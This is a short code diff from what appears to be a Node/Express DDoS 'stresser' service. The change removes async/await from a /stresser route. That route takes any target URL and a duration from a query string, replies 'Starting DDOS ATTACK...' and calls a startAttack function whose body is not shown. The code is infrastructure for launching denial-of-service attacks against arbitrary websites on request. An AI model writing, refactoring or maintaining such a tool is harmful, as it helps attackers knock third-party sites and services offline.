@@ -128,12 +128,12 @@ const startAttack = (url, durationHours) => {
   return true;
 };
 
-app.get("/stresser", async (req, res) => {
+app.get("/stresser", (req, res) => {
   const { url, duration = 1 } = req.query;
   if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Invalid URL." });
   if (isNaN(duration) || duration <= 0) return res.status(400).json({ error: "Invalid duration." });
 
-  await res.json({ message: "Starting DDOS ATTACK..." });
+  res.json({ message: "Starting DDOS ATTACK..." });
   startAttack(url, parseFloat(duration));
 });
 
